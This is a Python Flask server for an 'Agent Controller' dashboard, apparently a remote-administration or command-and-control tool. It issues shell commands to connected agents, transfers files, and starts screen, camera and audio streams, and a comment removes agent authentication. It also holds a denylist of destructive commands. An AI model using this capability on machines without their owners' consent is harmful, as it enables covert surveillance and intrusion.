  function getColor(varName){
    // read value from CSS variable
    return getComputedStyle(document.documentElement).getPropertyValue(varName) || '#00d4ff';
  }

  /* --------- helpers for updating DOM metrics --------- */
  function updateMetric(id,val){ const el=document.getElementById(id); if(el) el.innerText=val; }
  function appendToEl(id,txt){ const e=document.getElementById(id); if(e) e.innerText += '\\n'+txt; }

  /* --------- Overview and dashboard functions --------- */
  function issueCommand(){ const cmd = document.getElementById('command')?.value || ''; if(cmd) { socket.emit('issue_command', {command:cmd}); appendLog('Issued command: '+cmd);} }
  function listProcesses(){ socket.emit('list_processes'); appendLog('Requested process list'); }
  function getSystemInfo(){ socket.emit('get_agent_stats'); appendLog('Requested agent statistics'); }
  function getNetworkInfo(){ socket.emit('get_system_health'); appendLog('Requested system health'); }
  function refreshOverview(){ socket.emit('refresh_dashboard'); appendLog('Refreshing dashboard data'); }
  
  // Handle agent stats response
  socket.on('agent_stats_response', function(data) {
    if(data.reports) document.getElementById('agent-reports').textContent = data.reports;
    if(data.status) document.getElementById('agents-status').textContent = data.status;
    if(data.pass_rate) document.getElementById('pass-rate').textContent = data.pass_rate;
    if(data.trend) document.getElementById('trend-info').textContent = data.trend;
    appendLog('Agent statistics updated');
  });
  
  // Handle system health response
  socket.on('system_health_response', function(data) {
    if(data.controller_status) document.getElementById('controller-status').textContent = data.controller_status;
    if(data.monitoring_period) document.getElementById('monitoring-period').textContent = data.monitoring_period;
    if(data.uptime) document.getElementById('system-uptime').textContent = data.uptime;
    if(data.last_update) document.getElementById('last-update').textContent = data.last_update;
    appendLog('System health updated');
  });
  
  // Auto-refresh dashboard metrics every 30 seconds
  setInterval(() => {
    refreshOverview();
  }, 30000);
  function changePassword(){
    const p = document.getElementById('new-pass').value;
    if(!p || p.length<8){ alert('Choose password >= 8 chars'); return; }
    fetch('/change-password',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({current_password:'', new_password:p})})
      .then(r=>r.json()).then(j=>{ if(j.success) alert('Password changed'); else alert('Error: '+j.message) }).catch(e=>alert('Error'));
  }

  /* demo: update metrics every 7s */
  setInterval(()=>{ updateMetric('metric1', Math.floor(Math.random()*60)); updateMetric('metric2', Math.floor(Math.random()*40)); updateMetric('metric3', Math.floor(Math.random()*100)+'%'); updateMetric('m1', Math.floor(Math.random()*20)); },7000);

  /* demo: append a start line */
  appendLog('Dashboard ready — waiting for agents');

</script>
</body>
</html>
'''


# In-memory storage for agent data
AGENTS_DATA = defaultdict(lambda: {"sid": None, "last_seen": None})
DOWNLOAD_BUFFERS = defaultdict(lambda: {"chunks": [], "total_size": 0, "local_path": None})

# Remove the agent secret authentication - allow direct agent access
# AGENT_SHARED_SECRET = os.environ.get("AGENT_SHARED_SECRET", "sphinx_agent_secret")

# def require_agent_secret(f):
#     def decorated(*args, **kwargs):
#         if request.headers.get("X-AGENT-SECRET") != AGENT_SHARED_SECRET:
#             return "Forbidden", 403
#         return f(*args, **kwargs)
#     decorated.__name__ = f.__name__
#     return decorated

# --- Operator-facing endpoints ---

@app.route("/")
def index():
    if is_authenticated():
        # Serve a single unified dashboard to avoid confusion between two UIs
        return redirect(url_for('dashboard'))
    return redirect(url_for('login'))

@app.route("/dashboard")
@require_auth
def dashboard():
    # Serve a fully inlined single-file UI so deployment is self-contained
    try:
        base_dir = os.path.dirname(__file__)
        candidate_builds = [
            os.path.join(base_dir, 'agent-controller ui v2.1', 'build'),
            os.path.join(base_dir, 'agent-controller ui', 'build'),
        ]
        index_path = None
        for b in candidate_builds:
            p = os.path.join(b, 'index.html')
            if os.path.exists(p):
                index_path = p
                break
        if index_path:
            with open(index_path, 'r', encoding='utf-8', errors='replace') as f:
                index_html = f.read()
            assets_dir = os.path.join(os.path.dirname(index_path), 'assets')
            # Extract built asset filenames referenced by index.html
            import re
            css_files = re.findall(r'href=\"/assets/([^\"]+?\.css)\"', index_html)
            js_files = re.findall(r'src=\"/assets/([^\"]+?\.js)\"', index_html)
            css_inline = ""
            js_inline = ""
            for cf in css_files:
                fp = os.path.join(assets_dir, cf)
                if os.path.exists(fp):
                    with open(fp, 'r', encoding='utf-8', errors='replace') as f:
                        css_inline += f.read()
            for jf in js_files:
                fp = os.path.join(assets_dir, jf)
                if os.path.exists(fp):
                    with open(fp, 'r', encoding='utf-8', errors='replace') as f:
                        js_inline += f.read()
            # Runtime overrides to ensure same-origin backend
            runtime_overrides = """
            <script>
            window.__SOCKET_URL__ = window.location.protocol + '//' + window.location.host;
            window.__API_URL__ = window.__SOCKET_URL__;
            </script>
            """
            html = f"""
            <!DOCTYPE html>
            <html lang=\"en\">
              <head>
                <meta charset=\"UTF-8\" />
                <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />
                <title>Agent Controller</title>
                <style>{css_inline}</style>
                {runtime_overrides}
              </head>
              <body>
                <div id=\"root\"></div>
                <script type=\"module\">{js_inline}</script>
              </body>
            </html>
            """
            return Response(html, mimetype='text/html')
        else:
            # If index.html isn't found, try direct asset inlining as a secondary strategy
            def find_asset(glob_pattern_candidates):
                for assets_dir, pattern in glob_pattern_candidates:
                    try:
                        if os.path.isdir(assets_dir):
                            for fname in sorted(os.listdir(assets_dir)):
                                if fname.startswith(pattern[0]) and fname.endswith(pattern[1]):
                                    return os.path.join(assets_dir, fname)
                    except Exception:
                        continue
                return None
            assets_dirs = [
                os.path.join(base_dir, 'agent-controller ui v2.1', 'build', 'assets'),
                os.path.join(base_dir, 'agent-controller ui', 'build', 'assets'),
            ]
            css_path = find_asset([(d, ('index-', '.css')) for d in assets_dirs])
            js_path = find_asset([(d, ('index-', '.js')) for d in assets_dirs])
            if not css_path or not js_path:
                raise FileNotFoundError('Built assets not found in assets directories')
            with open(css_path, 'r', encoding='utf-8', errors='replace') as f:
                css_inline = f.read()
            with open(js_path, 'r', encoding='utf-8', errors='replace') as f:
                js_bundle = f.read()
            runtime_overrides = """
            <script>
            window.__SOCKET_URL__ = window.location.protocol + '//' + window.location.host;
            window.__API_URL__ = window.__SOCKET_URL__;
            </script>
            """
            html = f"""
            <!DOCTYPE html>
            <html lang=\"en\">
              <head>
                <meta charset=\"UTF-8\" />
                <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />
                <title>Agent Controller</title>
                <style>{css_inline}</style>
                {runtime_overrides}
              </head>
              <body>
                <div id=\"root\"></div>
                <script type=\"module\">{js_bundle}</script>
              </body>
            </html>
            """
            return Response(html, mimetype='text/html')
    except Exception as e:
        print(f"Failed to inline dashboard, falling back to static file: {e}")
        # Fallback to static file if inline fails
        build_path = os.path.join(os.path.dirname(__file__), 'agent-controller ui', 'build', 'index.html')
        if not os.path.exists(build_path):
            build_path = os.path.join(os.path.dirname(__file__), 'agent-controller ui v2.1', 'build', 'index.html')
        return send_file(build_path)

# Serve static assets for the UI v2.1
@app.route('/assets/<path:filename>')
def serve_assets(filename):
    base_dir = os.path.dirname(__file__)
    candidates = [
        os.path.join(base_dir, 'agent-controller ui v2.1', 'build', 'assets'),
        os.path.join(base_dir, 'agent-controller ui', 'build', 'assets'),
    ]
    for assets_dir in candidates:
        candidate_path = os.path.join(assets_dir, filename)
        if os.path.isfile(candidate_path):
            try:
                with open(candidate_path, 'rb') as f:
                    data = f.read()
                mime = 'text/css' if filename.endswith('.css') else 'application/javascript'
                return Response(data, mimetype=mime)
            except Exception:
                continue
    return ("Asset not found", 404)

@app.route('/debug-assets')
@require_auth
def debug_assets():
    base_dir = os.path.dirname(__file__)
    dirs = [
        os.path.join(base_dir, 'agent-controller ui v2.1', 'build'),
        os.path.join(base_dir, 'agent-controller ui v2.1', 'build', 'assets'),
        os.path.join(base_dir, 'agent-controller ui', 'build'),
        os.path.join(base_dir, 'agent-controller ui', 'build', 'assets'),
    ]
    out = []
    for d in dirs:
        exists = os.path.isdir(d)
        files = []
        if exists:
            try:
                for fname in os.listdir(d):
                    fp = os.path.join(d, fname)
                    try:
                        size = os.path.getsize(fp)
                    except Exception:
                        size = None
                    files.append({'name': fname, 'size': size})
            except Exception:
                pass
        out.append({'dir': d, 'exists': exists, 'files': files})
    return jsonify(out)
# --- Real-time Streaming Endpoints (COMMENTED OUT - REPLACED WITH OVERVIEW) ---
# 
# STREAMING OPTIMIZATION FOR REAL-TIME MONITORING:
# - Frame interval: 0.5 seconds (2 FPS)
# - Optimized for real-time monitoring with 0.5-second picture updates
# - Reduced latency and improved responsiveness
# - Better performance for monitoring applications
#

# VIDEO_FRAMES = defaultdict(lambda: None)
# CAMERA_FRAMES = defaultdict(lambda: None)
# AUDIO_CHUNKS = defaultdict(lambda: queue.Queue())

# Frame timing for real-time monitoring
# FRAME_INTERVAL = 0.5  # 0.5-second intervals for 2 FPS

# HTTP streaming endpoints for browser compatibility (COMMENTED OUT)
# @app.route('/video_feed/<agent_id>')
# @require_auth
# def video_feed(agent_id):
#     """Stream video feed for a specific agent"""
#     def generate_video():
#         while True:
#             if agent_id in VIDEO_FRAMES_H264 and VIDEO_FRAMES_H264[agent_id]:
#                 frame = VIDEO_FRAMES_H264[agent_id]
#                 yield (b'--frame\r\n'
#                        b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
#             else:
#                 # Generate a demo frame with agent ID for testing
#                 import io
#                 from PIL import Image, ImageDraw, ImageFont
#                 
#                 # Create a demo image
#                 img = Image.new('RGB', (640, 480), color='#1e40af')
#                 draw = ImageDraw.Draw(img)
#                 
#                 # Try to use a font, fallback to default if not available
#                 try:
#                     font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 36)
#                 except:
#                     font = ImageFont.load_default()
#                 
#                 # Draw demo text
#                 draw.text((320, 200), f"Agent {agent_id}", fill='white', anchor='mm', font=font)
#                 draw.text((320, 250), "Screen Stream", fill='white', anchor='mm', font=font)
#                 draw.text((320, 300), "Demo Mode", fill='white', anchor='mm', font=font)
#                 
#                 # Convert to JPEG
#                 img_io = io.BytesIO()
#                 img.save(img_io, 'JPEG', quality=85)
#                 img_io.seek(0)
#                 demo_frame = img_io.getvalue()
#                 
#                 yield (b'--frame\r\n'
#                        b'Content-Type: image/jpeg\r\n\r\n' + demo_frame + b'\r\n')
#             time.sleep(0.5)  # 2 FPS
#     
#     return Response(generate_video(),
#                     mimetype='multipart/x-mixed-replace; boundary=frame',
#                     headers={'Cache-Control': 'no-cache, no-store, must-revalidate',
#                             'Pragma': 'no-cache',
#                             'Expires': '0'})

# @app.route('/camera_feed/<agent_id>')
# @require_auth
# def camera_feed(agent_id):
#     """Stream camera feed for a specific agent"""
#     def generate_camera():
#         while True:
#             if agent_id in CAMERA_FRAMES_H264 and CAMERA_FRAMES_H264[agent_id]:
#                 frame = CAMERA_FRAMES_H264[agent_id]
#                 yield (b'--frame\r\n'
#                        b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
#             else:
#                 # Generate a demo frame with agent ID for testing
#                 import io
#                 from PIL import Image, ImageDraw, ImageFont
#                 
#                 # Create a demo image
#                 img = Image.new('RGB', (640, 480), color='#059669')
#                 draw = ImageDraw.Draw(img)
#                 
#                 # Try to use a font, fallback to default if not available
#                 try:
#                     font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 36)
#                 except:
#                     font = ImageFont.load_default()
#                 
#                 # Draw demo text
#                 draw.text((320, 200), f"Agent {agent_id}", fill='white', anchor='mm', font=font)
#                 draw.text((320, 250), "Camera Stream", fill='white', anchor='mm', font=font)
#                 draw.text((320, 300), "Demo Mode", fill='white', anchor='mm', font=font)
#                 
#                 # Convert to JPEG
#                 img_io = io.BytesIO()
#                 img.save(img_io, 'JPEG', quality=85)
#                 img_io.seek(0)
#                 demo_frame = img_io.getvalue()
#                 
#                 yield (b'--frame\r\n'
#                        b'Content-Type: image/jpeg\r\n\r\n' + demo_frame + b'\r\n')
#             time.sleep(0.5)  # 2 FPS
#     
#     return Response(generate_camera(),
#                     mimetype='multipart/x-mixed-replace; boundary=frame',
#                     headers={'Cache-Control': 'no-cache, no-store, must-revalidate',
#                             'Pragma': 'no-cache',
#                             'Expires': '0'})

# @app.route('/audio_feed/<agent_id>')
# @require_auth
# def audio_feed(agent_id):
#     """Stream audio feed for a specific agent"""
#     def generate_audio():
#         while True:
#             if agent_id in AUDIO_FRAMES_OPUS and AUDIO_FRAMES_OPUS[agent_id]:
#                 frame = AUDIO_FRAMES_OPUS[agent_id]
#                 yield frame
#             else:
#                 # Send silence if no data available
#                 yield b'\x00' * 1024
#             time.sleep(0.1)  # 10 FPS for audio
#     
#     return Response(generate_audio(),
#                     mimetype='audio/wav',
#                     headers={'Cache-Control': 'no-cache, no-store, must-revalidate',
#                             'Pragma': 'no-cache',
#                             'Expires': '0'})

# --- NEW API ENDPOINTS FOR MODERN UI ---

# Authentication API for frontend
@app.route('/api/auth/login', methods=['POST'])
def api_login():
    """API endpoint for frontend authentication"""
    if not request.is_json:
        return jsonify({'error': 'JSON payload required'}), 400
    
    password = request.json.get('password')
    if not password:
        return jsonify({'error': 'Password is required'}), 400
    
    # Check if IP is blocked
    client_ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.environ.get('REMOTE_ADDR', '0.0.0.0'))
    if is_ip_blocked(client_ip):
        return jsonify({'error': 'Too many failed attempts. Try again later.'}), 429
    
    # Verify password
    if verify_password(password, ADMIN_PASSWORD_HASH, ADMIN_PASSWORD_SALT):
        # Clear failed attempts on successful login
        clear_login_attempts(client_ip)
        
        # Set session
        session.permanent = True
        session['authenticated'] = True
        session['login_time'] = datetime.datetime.now(datetime.timezone.utc).isoformat()
        session['ip'] = client_ip
        
        return jsonify({
            'success': True,
            'message': 'Login successful',
            'session_timeout': Config.SESSION_TIMEOUT
        })
    else:
        # Record failed attempt
        record_failed_login(client_ip)
        return jsonify({'error': 'Invalid password'}), 401

@app.route('/api/auth/logout', methods=['POST'])
@require_auth
def api_logout():
    """API endpoint for frontend logout"""
    session.clear()
    return jsonify({'success': True, 'message': 'Logged out successfully'})

@app.route('/api/auth/status', methods=['GET'])
def api_auth_status():
    """Check authentication status for frontend"""
    authenticated = is_authenticated()
    if authenticated:
        return jsonify({
            'authenticated': True,
            'login_time': session.get('login_time'),
            'session_timeout': Config.SESSION_TIMEOUT
        })
    else:
        return jsonify({'authenticated': False})

# --- NEW API ENDPOINTS FOR MODERN UI ---

# Agent Management API
@app.route('/api/agents', methods=['GET'])
@require_auth
def get_agents():
    """Get list of all agents with their status and performance metrics"""
    agents = []
    for agent_id, data in AGENTS_DATA.items():
        agent_info = {
            'id': agent_id,
            'name': data.get('name', f'Agent-{agent_id}'),
            'status': 'online' if data.get('sid') else 'offline',
            'platform': data.get('platform', 'Unknown'),
            'ip': data.get('ip', '0.0.0.0'),
            'last_seen': data.get('last_seen'),
            'capabilities': data.get('capabilities', ['screen', 'files', 'commands']),
            'performance': {
                'cpu': data.get('cpu_usage', 0),
                'memory': data.get('memory_usage', 0),
                'network': data.get('network_usage', 0)
            }
        }
        agents.append(agent_info)
    
    return jsonify({
        'agents': agents,
        'total_count': len(agents),
        'online_count': len([a for a in agents if a['status'] == 'online'])
    })

@app.route('/api/agents/<agent_id>', methods=['GET'])
@require_auth
def get_agent_details(agent_id):
    """Get detailed information about a specific agent"""
    if agent_id not in AGENTS_DATA:
        return jsonify({'error': 'Agent not found'}), 404
    
    data = AGENTS_DATA[agent_id]
    agent_info = {
        'id': agent_id,
        'name': data.get('name', f'Agent-{agent_id}'),
        'status': 'online' if data.get('sid') else 'offline',
        'platform': data.get('platform', 'Unknown'),
        'ip': data.get('ip', '0.0.0.0'),
        'last_seen': data.get('last_seen'),
        'capabilities': data.get('capabilities', ['screen', 'files', 'commands']),
        'performance': {
            'cpu': data.get('cpu_usage', 0),
            'memory': data.get('memory_usage', 0),
            'network': data.get('network_usage', 0)
        },
        'system_info': data.get('system_info', {}),
        'uptime': data.get('uptime', 0)
    }
    
    return jsonify(agent_info)

# Streaming Control API
@app.route('/api/agents/<agent_id>/stream/<stream_type>/start', methods=['POST'])
@require_auth
def start_stream(agent_id, stream_type):
    """Start a stream (screen, camera, or audio) for an agent"""
    if agent_id not in AGENTS_DATA:
        return jsonify({'error': 'Agent not found'}), 404
    
    if stream_type not in ['screen', 'camera', 'audio']:
        return jsonify({'error': 'Invalid stream type'}), 400
    
    agent_sid = AGENTS_DATA[agent_id].get('sid')
    if not agent_sid:
        return jsonify({'error': 'Agent not connected'}), 400
    
    quality = request.json.get('quality', 'high') if request.is_json else 'high'
    
    # Emit to agent
    socketio.emit('start_stream', {
        'type': stream_type,
        'quality': quality
    }, room=agent_sid)
    
    return jsonify({
        'success': True,
        'message': f'{stream_type.title()} stream started',
        'agent_id': agent_id,
        'stream_type': stream_type,
        'quality': quality
    })

@app.route('/api/agents/<agent_id>/stream/<stream_type>/stop', methods=['POST'])
@require_auth
def stop_stream(agent_id, stream_type):
    """Stop a stream for an agent"""
    if agent_id not in AGENTS_DATA:
        return jsonify({'error': 'Agent not found'}), 404
    
    if stream_type not in ['screen', 'camera', 'audio']:
        return jsonify({'error': 'Invalid stream type'}), 400
    
    agent_sid = AGENTS_DATA[agent_id].get('sid')
    if not agent_sid:
        return jsonify({'error': 'Agent not connected'}), 400
    
    # Emit to agent
    socketio.emit('stop_stream', {
        'type': stream_type
    }, room=agent_sid)
    
    return jsonify({
        'success': True,
        'message': f'{stream_type.title()} stream stopped',
        'agent_id': agent_id,
        'stream_type': stream_type
    })

# Command Execution API
@app.route('/api/agents/<agent_id>/execute', methods=['POST'])
@require_auth
def execute_command(agent_id):
    """Execute a command on an agent"""
    # Input validation
    if not agent_id or not re.match(r'^[a-zA-Z0-9\-_]+$', agent_id):
        return jsonify({'error': 'Invalid agent ID format'}), 400
    
    if agent_id not in AGENTS_DATA:
        return jsonify({'error': 'Agent not found'}), 404
    
    agent_sid = AGENTS_DATA[agent_id].get('sid')
    if not agent_sid:
        return jsonify({'error': 'Agent not connected'}), 400
    
    if not request.is_json:
        return jsonify({'error': 'JSON payload required'}), 400
    
    command = request.json.get('command')
    if not command:
        return jsonify({'error': 'Command is required'}), 400
    
    # Validate command length and content
    command = command.strip()
    if len(command) > 1000:
        return jsonify({'error': 'Command too long (max 1000 characters)'}), 400
    
    # Block dangerous commands
    dangerous_patterns = [
        r'rm\s+-rf\s+/',  # rm -rf /
        r'del\s+/s\s+/q\s+c:',  # del /s /q c:
        r'format\s+c:',  # format c:
        r'shutdown\s+/s',  # shutdown /s
        r'halt',  # halt
        r'reboot',  # reboot
    ]
    
    for pattern in dangerous_patterns:
        if re.search(pattern, command, re.IGNORECASE):
            return jsonify({'error': 'Dangerous command blocked'}), 400
    
    # Generate execution ID
    execution_id = f"exec_{int(time.time())}_{secrets.token_hex(4)}"
    
    # Emit to agent (match agent listener 'command')
    socketio.emit('command', {
        'command': command,
        'execution_id': execution_id
    }, room=agent_sid)
    
    return jsonify({
        'success': True,
        'execution_id': execution_id,
        'command': command,
        'agent_id': agent_id
    })

@app.route('/api/agents/<agent_id>/commands/history', methods=['GET'])
@require_auth
def get_command_history(agent_id):
    """Get command execution history for an agent"""
    if agent_id not in AGENTS_DATA:
        return jsonify({'error': 'Agent not found'}), 404
    
    # In a real implementation, this would be stored in a database
    # For now, return mock data
    history = [
        {
            'id': 1,
            'command': 'systeminfo',
            'output': 'Host Name: WIN-DESKTOP-01\nOS Name: Microsoft Windows 11...',
            'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
            'success': True,
            'execution_time': 2.5
        },
        {
            'id': 2,
            'command': 'dir C:\\',
            'output': 'Volume in drive C has no label.\nDirectory of C:\\\n\n...',
            'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
            'success': True,
            'execution_time': 1.2
        }
    ]
    
    return jsonify({
        'history': history,
        'total_count': len(history)
    })

# File Management API
@app.route('/api/agents/<agent_id>/files', methods=['GET'])
@require_auth
def browse_files(agent_id):
    """Browse files on an agent"""
    if agent_id not in AGENTS_DATA:
        return jsonify({'error': 'Agent not found'}), 404
    
    agent_sid = AGENTS_DATA[agent_id].get('sid')
    if not agent_sid:
        return jsonify({'error': 'Agent not connected'}), 400
    
    path = request.args.get('path', '/')
    
    # In a real implementation, this would request files from the agent
    # For now, return mock data
    files = [
        {'name': '..', 'type': 'directory', 'size': None, 'modified': datetime.datetime.utcnow().isoformat() + 'Z', 'path': '..'},
        {'name': 'Documents', 'type': 'directory', 'size': None, 'modified': datetime.datetime.utcnow().isoformat() + 'Z', 'path': '/Documents'},
        {'name': 'Downloads', 'type': 'directory', 'size': None, 'modified': datetime.datetime.utcnow().isoformat() + 'Z', 'path': '/Downloads'},
        {'name': 'config.txt', 'type': 'file', 'size': 1024, 'modified': datetime.datetime.utcnow().isoformat() + 'Z', 'path': '/config.txt', 'extension': 'txt'},
        {'name': 'data.json', 'type': 'file', 'size': 2048, 'modified': datetime.datetime.utcnow().isoformat() + 'Z', 'path': '/data.json', 'extension': 'json'}
    ]
    
    return jsonify({
        'files': files,
        'current_path': path,
        'total_count': len(files)
    })

@app.route('/api/agents/<agent_id>/files/download', methods=['POST'])
@require_auth
def download_file(agent_id):
    """Download a file from an agent"""
    if agent_id not in AGENTS_DATA:
        return jsonify({'error': 'Agent not found'}), 404
    
    agent_sid = AGENTS_DATA[agent_id].get('sid')
    if not agent_sid:
        return jsonify({'error': 'Agent not connected'}), 400
    
    if not request.is_json:
        return jsonify({'error': 'JSON payload required'}), 400
    
    file_path = request.json.get('path')
    if not file_path:
        return jsonify({'error': 'File path is required'}), 400
    
    # Generate download ID
    download_id = f"dl_{int(time.time())}_{secrets.token_hex(4)}"
    
    # Emit to agent
    socketio.emit('download_file', {
        'path': file_path,
        'download_id': download_id
    }, room=agent_sid)
    
    return jsonify({
        'success': True,
        'download_id': download_id,
        'file_path': file_path
    })

@app.route('/api/agents/<agent_id>/files/upload', methods=['POST'])
@require_auth
def upload_file(agent_id):
    """Upload a file to an agent"""
    if agent_id not in AGENTS_DATA:
        return jsonify({'error': 'Agent not found'}), 404
    
    agent_sid = AGENTS_DATA[agent_id].get('sid')
    if not agent_sid:
        return jsonify({'error': 'Agent not connected'}), 400
    
    # Handle file upload
    if 'file' not in request.files:
        return jsonify({'error': 'No file provided'}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No file selected'}), 400
    
    # Generate upload ID
    upload_id = f"ul_{int(time.time())}_{secrets.token_hex(4)}"
    
    # In a real implementation, you would handle the file transfer
    # For now, just return success
    return jsonify({
        'success': True,
        'upload_id': upload_id,
        'filename': file.filename
    })

# System Monitoring API
@app.route('/api/system/stats', methods=['GET'])
@require_auth
def get_system_stats():
    """Get overall system statistics"""
    online_agents = [a for a in AGENTS_DATA.values() if a.get('sid')]
    
    stats = {
        'agents': {
            'total': len(AGENTS_DATA),
            'online': len(online_agents),
            'offline': len(AGENTS_DATA) - len(online_agents)
        },
        'streams': {
            'active': 2,  # Mock data
            'screen': 1,
            'camera': 1,
            'audio': 0
        },
        'commands': {
            'executed_today': 127,  # Mock data
            'successful': 115,
            'failed': 12
        },
        'network': {
            'status': 'stable',
            'latency': 12,
            'throughput': 2.4
        }
    }
    
    return jsonify(stats)

@app.route('/api/agents/<agent_id>/performance', methods=['GET'])
@require_auth
def get_agent_performance(agent_id):
    """Get performance metrics for a specific agent"""
    if agent_id not in AGENTS_DATA:
        return jsonify({'error': 'Agent not found'}), 404
    
    data = AGENTS_DATA[agent_id]
    
    # Mock performance data - in real implementation, this would come from the agent
    performance = {
        'cpu': {
            'usage': data.get('cpu_usage', 45),
            'temperature': 65,
            'cores': 8,
            'frequency': 3.2
        },
        'memory': {
            'used': data.get('memory_usage', 62),
            'total': 16,
            'available': 6.1
        },
        'storage': {
            'used': 78,
            'total': 500,
            'available': 110
        },
        'network': {
            'upload': 2.4,
            'download': 15.7,
            'latency': data.get('network_latency', 12)
        }
    }
    
    return jsonify(performance)

# Activity Feed API
@app.route('/api/activity', methods=['GET'])
@require_auth
def get_activity_feed():
    """Get activity feed with optional filtering"""
    activity_type = request.args.get('type', 'all')
    limit = int(request.args.get('limit', 50))
    
    # Mock activity data - in real implementation, this would be stored in a database
    activities = [
        {
            'id': 'act-001',
            'type': 'connection',
            'action': 'Agent Connected',
            'details': 'Successfully established connection',
            'agent_id': 'agent-001',
            'agent_name': 'Windows-Desktop-01',
            'timestamp': (datetime.datetime.utcnow() - datetime.timedelta(seconds=30)).isoformat() + 'Z',
            'status': 'success'
        },
        {
            'id': 'act-002',
            'type': 'stream',
            'action': 'Screen Stream Started',
            'details': 'High quality stream initiated',
            'agent_id': 'agent-001',
            'agent_name': 'Windows-Desktop-01',
            'timestamp': (datetime.datetime.utcnow() - datetime.timedelta(minutes=2)).isoformat() + 'Z',
            'status': 'info'
        },
        {
            'id': 'act-003',
            'type': 'command',
            'action': 'Command Executed',
            'details': 'systeminfo command completed successfully',
            'agent_id': 'agent-002',
            'agent_name': 'Linux-Server-01',
            'timestamp': (datetime.datetime.utcnow() - datetime.timedelta(minutes=3)).isoformat() + 'Z',
            'status': 'success'
        }
    ]
    
    # Filter by type if specified
    if activity_type != 'all':
        activities = [a for a in activities if a['type'] == activity_type]
    
    # Limit results
    activities = activities[:limit]
    
    return jsonify({
        'activities': activities,
        'total_count': len(activities),
        'filter': activity_type
    })

# Quick Actions API
@app.route('/api/actions/bulk', methods=['POST'])
@require_auth
def execute_bulk_action():
    """Execute a bulk action on multiple agents"""
    if not request.is_json:
        return jsonify({'error': 'JSON payload required'}), 400
    
    action = request.json.get('action')
    agent_ids = request.json.get('agent_ids', [])
    
    if not action:
        return jsonify({'error': 'Action is required'}), 400
    
    # If no specific agents provided, apply to all online agents
    if not agent_ids:
        agent_ids = [aid for aid, data in AGENTS_DATA.items() if data.get('sid')]
    
    results = []
    for agent_id in agent_ids:
        if agent_id in AGENTS_DATA:
            agent_sid = AGENTS_DATA[agent_id].get('sid')
            if agent_sid:
                # Emit action to agent
                socketio.emit('bulk_action', {
                    'action': action
                }, room=agent_sid)
                
                results.append({
                    'agent_id': agent_id,
                    'status': 'sent',
                    'message': f'Action {action} sent to agent'
                })
            else:
                results.append({
                    'agent_id': agent_id,
                    'status': 'failed',
                    'message': 'Agent not connected'
                })
        else:
            results.append({
                'agent_id': agent_id,
                'status': 'failed',
                'message': 'Agent not found'
            })
    
    return jsonify({
        'success': True,
        'action': action,
        'results': results,
        'total_agents': len(agent_ids),
        'successful': len([r for r in results if r['status'] == 'sent'])
    })

if LIMITER_AVAILABLE:
    pass

# Search and Filter API
@app.route('/api/agents/search', methods=['GET'])
@require_auth
def search_agents():
    """Search and filter agents"""
    search_term = request.args.get('q', '').lower()
    status_filter = request.args.get('status')
    platform_filter = request.args.get('platform')
    capability_filter = request.args.get('capability')
    
    agents = []
    for agent_id, data in AGENTS_DATA.items():
        agent_info = {
            'id': agent_id,
            'name': data.get('name', f'Agent-{agent_id}'),
            'status': 'online' if data.get('sid') else 'offline',
            'platform': data.get('platform', 'Unknown'),
            'ip': data.get('ip', '0.0.0.0'),
            'last_seen': data.get('last_seen'),
            'capabilities': data.get('capabilities', ['screen', 'files', 'commands']),
            'performance': {
                'cpu': data.get('cpu_usage', 0),
                'memory': data.get('memory_usage', 0),
                'network': data.get('network_usage', 0)
            }
        }
        
        # Apply filters
        if search_term:
            if not (search_term in agent_info['name'].lower() or 
                   search_term in agent_info['platform'].lower() or 
                   search_term in agent_info['ip']):
                continue
        
        if status_filter and agent_info['status'] != status_filter:
            continue
        
        if platform_filter and platform_filter.lower() not in agent_info['platform'].lower():
            continue
        
        if capability_filter and capability_filter not in agent_info['capabilities']:
            continue
        
        agents.append(agent_info)
    
    return jsonify({
        'agents': agents,
        'total_count': len(agents),
        'filters': {
            'search': search_term,
            'status': status_filter,
            'platform': platform_filter,
            'capability': capability_filter
        }
    })

# Settings Management API
@app.route('/api/settings', methods=['GET'])
@require_auth
def get_settings():
    """Get current system settings (merged with defaults)."""
    current = load_settings()
    # Redact sensitive values
    safe = json.loads(json.dumps(current))
    try:
        if 'authentication' in safe:
            # Do not return admin password; apiKey can be returned if enabled
            if 'adminPassword' in safe['authentication']:
                safe['authentication']['adminPassword'] = ''
            # Mask API key partially
            api = safe['authentication'].get('apiKey')
            if api:
                safe['authentication']['apiKey'] = api[:4] + "***" + api[-4:]
        if 'email' in safe and 'password' in safe['email']:
            safe['email']['password'] = ''
    except Exception as e:
        print(f"Warning redacting settings: {e}")
    return jsonify(safe)

if LIMITER_AVAILABLE:
    pass

@app.route('/api/settings', methods=['POST'])
@require_auth
def update_settings():
    """Update system settings and persist to settings.json. Some changes may need restart."""
    if not request.is_json:
        return jsonify({'error': 'JSON payload required'}), 400
    incoming = request.json
    current = load_settings()
    updated = _deep_update(current, incoming)
    if not save_settings(updated):
        return jsonify({'success': False, 'message': 'Failed to save settings'}), 500

    # Apply a subset live where safe (e.g., WebRTC toggles)
    try:
        if 'webrtc' in incoming:
            webrtc = incoming['webrtc']
            if 'enabled' in webrtc:
                WEBRTC_CONFIG['enabled'] = bool(webrtc['enabled'])
            if 'iceServers' in webrtc:
                WEBRTC_CONFIG['ice_servers'] = webrtc['iceServers']
    except Exception as e:
        print(f"Warning applying live settings: {e}")

    # Determine if restart is required for certain keys
    restart_required = False
    critical_paths = [
        ('server', 'serverPort'),
        ('server', 'sslEnabled'),
        ('security', 'frontendOrigins')
    ]
    for sect, key in critical_paths:
        if sect in incoming and key in incoming.get(sect, {}):
            restart_required = True
            break
    # Notify all connected agents of new config
    try:
        for _agent_id, _data in AGENTS_DATA.items():
            if _data.get('sid'):
                _emit_agent_config(_agent_id)
    except Exception:
        pass
    return jsonify({'success': True, 'message': 'Settings saved.', 'restart_required': restart_required})

if LIMITER_AVAILABLE:
    pass

